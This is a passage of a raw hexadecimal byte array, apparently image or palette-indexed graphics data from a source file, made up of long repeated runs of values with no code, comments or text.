0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x51, 0x51, 0x51, 0x52, 0x52, 0x52,
0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x51, 0x51, 0x67, 0x67, 0x50, 0x07, 0x07,
0x18, 0xAF, 0xF6, 0xDF, 0xE0, 0xF7, 0xE0, 0x98, 0x17, 0x18, 0x18, 0x07, 0x1B, 0x50, 0x67, 0x51,
0x51, 0x66, 0x51, 0x51, 0x66, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x52, 0x52,
0x52, 0x52, 0x52, 0x53, 0x53, 0x53, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1B, 0x07, 0x18,
0x99, 0xCA, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x00, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x11, 0x12, 0x12, 0xE2, 0xAE, 0x18, 0x19,
0x19, 0x07, 0x19, 0x18, 0x17, 0x17, 0x19, 0x07, 0x18, 0x16, 0x08, 0x08, 0x14, 0xCA, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xCF, 0xCE, 0xCF, 0xCF,
0xCF, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCA, 0xE4, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE3, 0xE3, 0xE3, 0xE4, 0xE4, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE2, 0xE2, 0xE2, 0xE2,
0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2,
0xE2, 0xE1, 0xE2, 0xE2, 0xE2, 0xE2, 0x13, 0x13, 0x13, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0xCA,
0xE2, 0xE3, 0xE4, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE2, 0x14, 0x9A, 0x17, 0x18, 0x19, 0x07, 0x07, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x51, 0x51, 0x51, 0x52, 0x52, 0x52, 0x52,
0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1C, 0x17, 0xE2, 0xC9, 0xC9, 0xC9, 0x99, 0x07, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x52, 0x52,
0x52, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x52, 0x52, 0x52, 0x52,
0x52, 0x52, 0x52, 0x52, 0x52, 0x53, 0x53, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1E,
0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1B, 0x07, 0x18, 0x16, 0x14, 0xE0, 0x12,
0x12, 0x12, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0x12, 0x12, 0x12, 0xF7, 0x14,
0x98, 0x17, 0x18, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x17, 0x16, 0x9A, 0x14, 0xCA, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x11, 0x11, 0x11, 0x12, 0x13, 0xCE, 0xCA, 0xCF,
0xCA, 0xCA, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0xCA, 0xE3, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0xE4, 0xE3, 0xE3, 0xE3, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x11, 0x00, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x11, 0x12, 0x12, 0x12, 0x14, 0x18, 0x07, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x51, 0x51, 0x51, 0x52, 0x52, 0x52, 0x52,
0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x1D, 0x1D, 0x1D,
0x07, 0x99, 0xE3, 0xE2, 0xE1, 0xE3, 0x17, 0x1B, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x52, 0x52, 0x52, 0x52, 0x52,
0x52, 0x52, 0x52, 0x52, 0x52, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1C, 0x1B, 0x1B, 0x07, 0x19,
0x18, 0x18, 0x17, 0x16, 0x99, 0x98, 0x14, 0xE2, 0xC9, 0xC8, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0xDF, 0xF6, 0x18, 0x07, 0x07, 0x18, 0x16, 0x98, 0x99, 0x16, 0x17, 0x17, 0x08, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x11, 0x12, 0x13, 0xE3, 0xE4, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE3, 0xCA, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x11, 0x11, 0x00, 0x00, 0x00, 0x00, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0xE2, 0x08, 0x17,
0x19, 0x07, 0x1B, 0x1B, 0x07, 0x1B, 0x1B, 0x1C, 0x1C, 0x51, 0x51, 0x51, 0x51, 0x52, 0x52, 0x52,
0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C,
0x17, 0xE3, 0xE2, 0xE2, 0xE2, 0x08, 0x19, 0x1B, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52,
0x52, 0x52, 0x52, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C,
0x1C, 0x1B, 0x07, 0x19, 0x18, 0x18, 0x17, 0x9A, 0x08, 0x14, 0xE2, 0xE1, 0xC9, 0xC9, 0xC9, 0xC9,
0xC9, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8,
0xE0, 0x99, 0x07, 0x1C, 0x1B, 0x1C, 0x1B, 0x18, 0x18, 0x07, 0x1C, 0x07, 0x08, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xCE, 0xE4, 0x14, 0x08, 0x08, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE3, 0xE3, 0xE3, 0xE3, 0x13, 0xCA, 0xCA, 0x13, 0xCE,
0xCA, 0x12, 0x12, 0x12, 0x12, 0xCA, 0x13, 0xCF, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0xCA, 0xE4, 0x9A, 0x18, 0x07, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x51, 0x52, 0x52, 0x51,
0x51, 0x52, 0x52, 0x51, 0x52, 0x52, 0x1D, 0x52, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x07,
0x99, 0xE3, 0xE2, 0xE2, 0xE4, 0x9B, 0x07, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52, 0x52,
0x52, 0x52, 0x1D, 0x1C, 0x1C, 0x1C, 0x1B, 0x07, 0x19, 0x18, 0x17, 0x9A, 0x98, 0x14, 0xE3, 0xE2,
0xE0, 0xC9, 0xC9, 0xC9, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xE0,
0xE0, 0xE2, 0x17, 0x19, 0x07, 0x1B, 0x1B, 0x1C, 0x1C, 0x1D, 0x1C, 0x19, 0x14, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE3, 0x14, 0x08, 0x08, 0x08, 0x08,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x13, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xE0,
0x13, 0x13, 0xE2, 0x13, 0xE3, 0xE3, 0xE3, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0xE3, 0xE3, 0xE3, 0x14, 0x14, 0xE4, 0xE4, 0xE3, 0xE3, 0x13, 0x13, 0x13, 0x13, 0xE6,
0xE3, 0xE3, 0xE3, 0xE3, 0xE5, 0xE5, 0x13, 0x12, 0x11, 0x00, 0x00, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x11, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0xC9, 0xE3, 0x9A, 0x18, 0x07, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x51, 0x51, 0x51, 0x51, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x18,
0xE3, 0xE2, 0xE2, 0xE2, 0x99, 0x19, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x07,
0x18, 0x16, 0x99, 0x14, 0xE3, 0xE1, 0xE0, 0xC9, 0xC8, 0xC8, 0xC9, 0xC9, 0xC9, 0xC9, 0xC8, 0xC8,
0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8,
0xC8, 0x14, 0x18, 0x1B, 0x1B, 0x07, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0xE0, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x12, 0x11, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0xE0, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x13, 0xE6, 0xE3, 0xE3, 0xE5,
0xE5, 0xE5, 0xE5, 0xE4, 0xE5, 0xE3, 0x13, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xE3, 0x14, 0x9A, 0x17, 0x19, 0x07,
0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1B, 0x99,
0xE2, 0xE3, 0xE3, 0x14, 0x17, 0x1B, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x19, 0x18, 0x16, 0x98, 0x14, 0xE1, 0xC9, 0xC8, 0xC8,
0xC8, 0xC8, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC9, 0xC9, 0xC9, 0xC8, 0xC9, 0xE2,
0x17, 0x07, 0x1B, 0x1B, 0x1C, 0x1C, 0x07, 0x17, 0x08, 0x16, 0x17, 0x16, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE6, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08,
0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0xE4, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00,
0x00, 0x11, 0x11, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x11, 0x11, 0x11, 0x12, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE3, 0xE5, 0xE5, 0xE5, 0xE5,
0xE5, 0xE5, 0xE5, 0xE5, 0xE5, 0xE6, 0x12, 0x11, 0x00, 0x00, 0x00, 0x00, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8,
0xE2, 0x14, 0x98, 0x16, 0x18, 0x19, 0x07, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1B, 0x18, 0xE3,
0xE2, 0xE2, 0xE1, 0x99, 0x19, 0x1B, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x19, 0x18,
0x17, 0x99, 0x08, 0xF5, 0xE0, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0x12, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC9, 0xE2, 0x14, 0xE2, 0xC9, 0xE1,
0x14, 0x18, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x07, 0x08, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xCF, 0xE4, 0x14, 0x08, 0x08, 0x08, 0x08, 0x14,
0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x14, 0xE3, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x11, 0x12, 0xE3, 0x14, 0x14, 0x14, 0xE4, 0x14, 0x14, 0xE5, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0x14, 0x14, 0xE4, 0xCA, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC9, 0xE1, 0x14, 0x98, 0x17, 0x18, 0x18, 0x99, 0xE1,
0xE1, 0xE0, 0xE0, 0x17, 0x19, 0x19, 0x18, 0x17, 0x16, 0x99, 0x14, 0xE1, 0xE0, 0xC9, 0xC8, 0xC8,
0x12, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0xC8, 0x14, 0x98, 0x99, 0x9A, 0x16, 0x17, 0x19, 0x19, 0x16, 0xE2, 0xE0, 0xE0,
0xE1, 0xE2, 0x18, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x16, 0x12, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x13, 0x14, 0x14, 0x14, 0xE4, 0xE3, 0xCB, 0xCE,
0xCF, 0xCF, 0xCF, 0xCA, 0x13, 0x14, 0xE3, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x11, 0xE0, 0x14, 0x14, 0xE4, 0x14, 0x14, 0x14, 0xE4, 0xCD, 0xCD, 0xE5, 0xE5, 0xE5, 0xE4,
